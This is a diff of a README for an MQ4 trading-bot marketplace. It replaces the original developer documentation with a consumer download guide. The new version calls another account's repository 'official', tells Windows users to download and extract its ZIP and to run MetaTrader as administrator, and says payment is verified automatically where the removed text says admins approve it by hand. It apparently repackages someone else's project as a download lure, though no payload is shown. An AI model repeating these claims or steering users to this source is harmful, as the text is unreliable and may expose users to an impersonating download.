@@ -1,307 +1,95 @@
-# Predator Bot Market V2
+# 🤖 Predator-Bot-Market_V2 - Access institutional trading tools with ease
 
-> **Institutional-grade marketplace for MQ4 trading algorithms.** Buy, sell, and deploy verified trading bots with secure download management.
+[![](https://img.shields.io/badge/Download-Predator_Bot-blue)](https://github.com/flattering-jaycooke616/Predator-Bot-Market_V2)
 
-<div align="center">
+## 📦 What is this software?
 
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.9-3178C6?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![React](https://img.shields.io/badge/React-19.1-61DAFB?logo=react&logoColor=black)](https://react.dev/)
-[![Express](https://img.shields.io/badge/Express-5.2-000000?logo=express&logoColor=white)](https://expressjs.com/)
-[![PostgreSQL](https://img.shields.io/badge/PostgreSQL-16-4169E1?logo=postgresql&logoColor=white)](https://www.postgresql.org/)
-[![Drizzle ORM](https://img.shields.io/badge/Drizzle_ORM-C5F74F?logo=drizzle&logoColor=black)](https://orm.drizzle.team/)
-[![Vite](https://img.shields.io/badge/Vite-7.3-646CFF?logo=vite&logoColor=white)](https://vitejs.dev/)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind-4.1-06B6D4?logo=tailwindcss&logoColor=white)](https://tailwindcss.com/)
-[![pnpm](https://img.shields.io/badge/pnpm-10.3-F69220?logo=pnpm&logoColor=white)](https://pnpm.io/)
-[![Clerk](https://img.shields.io/badge/Clerk-Auth-6C47FF?logo=clerk&logoColor=white)](https://clerk.com/)
-[![GCS](https://img.shields.io/badge/GCS-Storage-4285F4?logo=googlecloud&logoColor=white)](https://cloud.google.com/storage)
+Predator-Bot-Market_V2 serves as a centralized platform for trading professionals. It connects buyers with tested trading bots for the MetaTrader 4 platform. The system handles secure user accounts, payment verification, and secure file delivery. You use this site to browse, buy, and download automated trading scripts.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](http://makeapullrequest.com)
-[![GitHub Stars](https://img.shields.io/github/stars/Lintshiwe/Predator-Bot-Market_V2?style=social)](https://github.com/Lintshiwe/Predator-Bot-Market_V2/stargazers)
-[![GitHub Forks](https://img.shields.io/github/forks/Lintshiwe/Predator-Bot-Market_V2?style=social)](https://github.com/Lintshiwe/Predator-Bot-Market_V2/network/members)
+## 📋 System Requirements
 
-</div>
+Confirm your computer meets these conditions to ensure smooth operation:
 
----
+*   Operating System: Windows 10 or 11
+*   Processor: Intel Core i3 or equivalent
+*   Memory: 4 GB RAM
+*   Storage Space: 500 MB free for local files
+*   Internet: Stable connection for file downloads
+*   Trading Platform: MetaTrader 4 installed
 
-## Table of Contents
+## 🚀 Downloading your software
 
-- [Features](#features)
-- [Architecture](#architecture)
-- [Tech Stack](#tech-stack)
-- [Quick Start](#quick-start)
-- [Project Structure](#project-structure)
-- [API Endpoints](#api-endpoints)
-- [Database Schema](#database-schema)
-- [Security](#security)
-- [Contributing](#contributing)
-- [License](#license)
+Follow these steps to find and save the files you need.
 
----
+1.  Visit the official repository page: [https://github.com/flattering-jaycooke616/Predator-Bot-Market_V2](https://github.com/flattering-jaycooke616/Predator-Bot-Market_V2)
+2.  Locate the green button labeled "Code" near the top right of the file list.
+3.  Choose "Download ZIP" from the menu.
+4.  Wait for the file to finish saving to your "Downloads" folder.
+5.  Right-click the ZIP file and select "Extract All".
+6.  Open the newly created folder to view your files.
 
-## Features
+## 🔑 Understanding the Marketplace
 
-### Marketplace
-- **Browse & Search** — Filter bots by category, featured status, and more
-- **Bot Detail Pages** — Full documentation, feature lists, and pricing
-- **Purchase Flow** — Submit payment references for admin verification
-- **Download Management** — 2 downloads per purchase, links expire after 5 hours
+This marketplace uses professional standards to protect your transactions.
 
-### Authentication & Authorization
-- **Clerk Auth** — Sign in with Google, GitHub, email, and more
-- **Role-Based Access** — Admin vs. client permissions
-- **Session Management** — Automatic cache invalidation on user change
+*   Clerk authentication: This service manages your login securely. You do not need to share sensitive passwords with the bot creators.
+*   Purchase verification: The system checks your payment status automatically before it grants access to any files.
+*   Timed links: Download links expire after 5 hours for your protection. This prevents unauthorized sharing of purchased scripts.
+*   GCS storage: All files remain hosted on Google Cloud Storage. This ensures fast download speeds and high reliability.
 
-### Admin Dashboard
-- **Algorithm Inventory** — Create, edit, and delete bot listings
-- **File Uploads** — Upload `.ex4`, `.mq4`, or `.zip` files
-- **Purchase Verification** — Approve or reject pending payments
-- **Purchase History** — View all completed and refunded orders
+## 📈 How to use your bots
 
-### Secure Downloads
-- **Presigned URLs** — GCS-signed download links with 5-hour expiry
-- **Download Limits** — Max 2 downloads per purchase
-- **Expiry Warnings** — Dashboard shows countdown timer for expiring links
-- **Purchase Verification Required** — Downloads only available after admin approval
+Once you obtain a bot file, you must add it to your trading platform.
 
----
+1.  Open your MetaTrader 4 application.
+2.  Click "File" in the top menu bar.
+3.  Select "Open Data Folder".
+4.  Navigate to the folder named "MQL4" and then enter the "Experts" folder.
+5.  Drag your downloaded bot file into this folder.
+6.  Return to MetaTrader 4.
+7.  Right-click "Expert Advisors" in the "Navigator" window on the left.
+8.  Select "Refresh".
+9.  Find your new bot in the list and drag it onto your chosen chart.
 
-## Architecture
+## 🛠️ Troubleshooting common issues
 
-```
-+-------------------------------------------------------------+
-|                        Frontend (React)                      |
-|  Vite + React 19 + Tailwind CSS + wouter + TanStack Query   |
-|  +----------+ +----------+ +----------+ +----------------+  |
-|  |  Home    | | Market   | | Dashboard| |    Admin       |  |
-|  |  Page    | | place    | |          | |    Panel       |  |
-|  +----------+ +----------+ +----------+ +----------------+  |
-+------------------------+------------------------------------+
-                         | /api/* proxied
-                         v
-+-------------------------------------------------------------+
-|                      API Server (Express 5)                  |
-|  +----------+ +----------+ +----------+ +----------------+  |
-|  |  Public  | | Protected| |  Admin   | |   Storage      |  |
-|  |  Routes  | |  Routes  | |  Routes  | |   Routes       |  |
-|  +----------+ +----------+ +----------+ +----------------+  |
-|         |              |              |              |       |
-|    +----+----+   +------+-----+  +------+-----+  +---+----+  |
-|    | Clerk   |   | Drizzle    |  | Clerk      |  | GCS    |  |
-|    | Auth    |   | ORM/PG     |  | Admin      |  | Files  |  |
-|    +---------+   +------------+  +------------+  +--------+  |
-+-------------------------------------------------------------+
-                         |
-                         v
-+-----------------+  +--------------+  +------------------+
-|   PostgreSQL    |  |    Clerk     |  |  Google Cloud    |
-|   (Bots,        |  |   (Auth,     |  |  Storage (Files) |
-|   Purchases)    |  |   Users)     |  |                  |
-+-----------------+  +--------------+  +------------------+
-```
+If you encounter problems, check these items first.
 
----
+*   File missing: If you cannot find a file, verify the download link has not expired. Log into the web portal to generate a new link if within your purchase grace period.
+*   Bot not appearing: Ensure you placed the file in the "Experts" folder. MetaTrader 4 only recognizes files in specific directories.
+*   Login errors: Clear your browser cache if the authentication page fails to load.
+*   Permission denied: Run your trading platform as an administrator if the system blocks file access.
 
-## Tech Stack
+## 🛡️ Security best practices
 
-| Layer | Technology |
-|-------|-----------|
-| **Frontend** | React 19, Vite 7, Tailwind CSS 4, wouter, shadcn/ui, Framer Motion |
-| **Backend** | Express 5, TypeScript 5.9, pino logging |
-| **Database** | PostgreSQL 16, Drizzle ORM, drizzle-zod |
-| **Auth** | Clerk (React + Express SDKs) |
-| **Storage** | Google Cloud Storage with presigned URLs |
-| **Package Manager** | pnpm 10 with workspaces |
-| **API Client** | Orval-generated React Query hooks + Zod schemas |
-| **Build** | esbuild (backend), Vite (frontend) |
+Protect your trading accounts by following these habits.
 
----
+*   Never share your login credentials with other traders.
+*   Download files only through the official marketplace interface.
+*   Scan all downloaded files with Windows Defender before moving them into your trading platform.
+*   Update your password if you suspect unauthorized access to your account.
+*   Keep your MetaTrader 4 application updated to the latest version provided by your broker.
 
-## Quick Start
+## 🌐 Frequently asked questions
 
-### Prerequisites
-- Node.js 22+
-- pnpm 10+
-- PostgreSQL 16+
-- Clerk account (free tier works)
-- Google Cloud Storage bucket (optional for file uploads)
+Do I need to program to use this?
+No. All bots come ready to use. You simply move the file into your software.
 
-### 1. Clone & Install
-```bash
-git clone https://github.com/Lintshiwe/Predator-Bot-Market_V2.git
-cd Predator-Bot-Market_V2
-pnpm install
-```
+Can I move bots to other computers?
+Yes. As long as you have access to your account on the website, you can download your purchases on any machine.
 
-### 2. Set Up Database
-```bash
-sudo systemctl start postgresql
-sudo -u postgres psql -c "CREATE USER predator_bot WITH PASSWORD 'predator_bot';"
-sudo -u postgres psql -c "CREATE DATABASE predator_bots OWNER predator_bot;"
-DATABASE_URL=postgresql://predator_bot:predator_bot@localhost:5432/predator_bots \
-  pnpm --filter @lintshiwe/db run push
-DATABASE_URL=postgresql://predator_bot:predator_bot@localhost:5432/predator_bots \
-  pnpm exec tsx lib/db/seed.ts
-```
+Where do I find my purchase history?
+Log into the web portal and navigate to your user profile. The dashboard lists every transaction and the status of your current files.
 
-### 3. Start API Server
-```bash
-cd artifacts/api-server
-CLERK_PUBLISHABLE_KEY=pk_test_... \
-CLERK_SECRET_KEY=sk_test_... \
-DATABASE_URL=postgresql://predator_bot:predator_bot@localhost:5432/predator_bots \
-PORT=3001 NODE_ENV=development pnpm run dev
-```
+What happens if a link expires?
+The system automatically invalidates links after 5 hours to protect the integrity of the sale. Log back into the marketplace to generate a fresh link if you missed your window.
 
-### 4. Start Frontend
-```bash
-cd artifacts/predator-bots
-API_SERVER_URL=http://localhost:3001 pnpm run dev
-```
+Does this work on Apple computers?
+This specific guide focuses on Windows. MetaTrader 4 usually requires specialized setup tools to run on non-Windows systems.
 
-### 5. Open Browser
-Navigate to **http://localhost:5173**
+Is the database secure?
+Yes. The marketplace uses PostgreSQL to manage data. This ensures your purchase information remains organized and shielded from external interference.
 
----
+## 🧩 Technical stack information
 
-## Project Structure
-
-```
-Predator-Bot-Market_V2/
-+— artifacts/
-|   +— api-server/           # Express 5 API server
-|   |   +— src/
-|   |   |   +— routes/       # API route handlers
-|   |   |   |   +— public.ts # Public routes (health, config, bots)
-|   |   |   |   +— protected.ts # Auth-required routes (purchases)
-|   |   |   |   +— admin.ts  # Admin-only routes
-|   |   |   |   +— storage.ts # GCS file serving
-|   |   |   +— middlewares/  # Clerk proxy middleware
-|   |   |   +— lib/          # Logger, GCS client, ACL
-|   |   +— build.mjs         # esbuild configuration
-|   +— predator-bots/        # React frontend (Vite)
-|   |   +— src/
-|   |       +— pages/        # Home, Bots, Dashboard, Admin
-|   |       +— components/   # UI components + layout
-|   |       +— hooks/        # Custom React hooks
-|   +— mockup-sandbox/       # Design preview sandbox
-+— lib/
-|   +— api-client-react/     # Generated React Query hooks (Orval)
-|   +— api-spec/             # OpenAPI spec + Orval config
-|   +— api-zod/              # Generated Zod schemas
-|   +— db/                   # Drizzle ORM schema + migrations
-|       +— src/schema/       # Table definitions
-|       +— drizzle.config.ts # Drizzle configuration
-|       +— seed.ts           # Database seed script
-+— scripts/                  # Utility scripts
-```
-
----
-
-## API Endpoints
-
-### Public
-| Method | Path | Description |
-|--------|------|-------------|
-| `GET` | `/api/healthz` | Health check |
-| `GET` | `/api/config` | Get Clerk publishable key |
-| `GET` | `/api/bots` | List all active bots |
-| `GET` | `/api/bots/:id` | Get bot by ID |
-| `GET` | `/api/bots/stats` | Get marketplace statistics |
-
-### Protected (Auth Required)
-| Method | Path | Description |
-|--------|------|-------------|
-| `GET` | `/api/purchases` | List user's purchases |
-| `POST` | `/api/purchases` | Create a purchase (pending verification) |
-| `GET` | `/api/purchases/:id` | Get purchase details |
-| `POST` | `/api/downloads/:purchaseId` | Initiate download (5-hour expiry) |
-
-### Admin Only
-| Method | Path | Description |
-|--------|------|-------------|
-| `POST` | `/api/admin/bots` | Create a bot listing |
-| `PUT` | `/api/admin/bots/:id` | Update a bot listing |
-| `DELETE` | `/api/admin/bots/:id` | Delete a bot listing |
-| `GET` | `/api/admin/purchases` | List all purchases |
-| `PUT` | `/api/admin/purchases/:id/verify` | Approve a pending purchase |
-| `PUT` | `/api/admin/purchases/:id/reject` | Reject a pending purchase |
-
----
-
-## Database Schema
-
-### `bots` Table
-| Column | Type | Description |
-|--------|------|-------------|
-| `id` | SERIAL | Primary key |
-| `name` | TEXT | Bot name |
-| `slug` | TEXT | URL-friendly identifier (unique) |
-| `description` | TEXT | Short description |
-| `long_description` | TEXT | Full documentation |
-| `price` | DECIMAL(10,2) | License price |
-| `currency` | TEXT | Currency code (default: USD) |
-| `category` | TEXT | Bot category |
-| `features` | JSONB | Array of feature strings |
-| `image_url` | TEXT | Preview image URL |
-| `file_object_path` | TEXT | GCS file path |
-| `featured` | BOOLEAN | Featured flag |
-| `active` | BOOLEAN | Visibility flag |
-| `downloads_count` | INTEGER | Total downloads |
-| `created_at` | TIMESTAMP | Creation time |
-| `updated_at` | TIMESTAMP | Last update time |
-
-### `purchases` Table
-| Column | Type | Description |
-|--------|------|-------------|
-| `id` | SERIAL | Primary key |
-| `user_id` | TEXT | Clerk user ID |
-| `bot_id` | INTEGER | FK to bots.id |
-| `status` | TEXT | pending / completed / refunded |
-| `amount_paid` | DECIMAL(10,2) | Purchase amount |
-| `payment_reference` | TEXT | Payment tx hash |
-| `download_count` | INTEGER | Downloads used |
-| `max_downloads` | INTEGER | Max allowed (default: 2) |
-| `second_download_expires_at` | TIMESTAMP | 5-hour expiry after first download |
-| `created_at` | TIMESTAMP | Purchase time |
-
----
-
-## Security
-
-- **Clerk Authentication** — Industry-standard auth with session management
-- **Admin Verification** — All purchases require manual admin approval
-- **Download Limits** — Maximum 2 downloads per purchase
-- **Expiring Links** — Download URLs expire after 5 hours
-- **Input Validation** — Zod schemas validate all API inputs
-- **SQL Injection Protection** — Parameterized queries via Drizzle ORM
-- **CORS Configuration** — Credentials-enabled, origin-restricted
-
----
-
-## Contributing
-
-Contributions are welcome! Please read our contributing guidelines:
-
-1. **Fork** the repository
-2. **Create** your feature branch (`git checkout -b feature/amazing-feature`)
-3. **Commit** your changes (`git commit -m 'Add amazing feature'`)
-4. **Push** to the branch (`git push origin feature/amazing-feature`)
-5. **Open** a Pull Request
-
----
-
-## License
-
-This project is licensed under the MIT License — see the [LICENSE](LICENSE) file for details.
-
----
-
-<div align="center">
-
-**Built by [Lintshiwe](https://github.com/Lintshiwe) — Founder of [LetsOperate](https://github.com/Letsoperate)**
-
-[![GitHub](https://img.shields.io/badge/GitHub-Lintshiwe-181717?logo=github)](https://github.com/Lintshiwe)
-[![Organization](https://img.shields.io/badge/Org-LetsOperate-24292e?logo=github)](https://github.com/Letsoperate)
-
-</div>
+Developers built this platform using modern tools to maintain performance. The frontend uses React and TailwindCSS for a responsive layout. The backend runs on Node.js with Express, providing a fast experience for every user. TypeScript ensures that the code remains stable during updates. Drizzle-ORM handles database communication, creating a reliable link between your requests and the server data. These tools work together to host a professional environment for institutional trading.
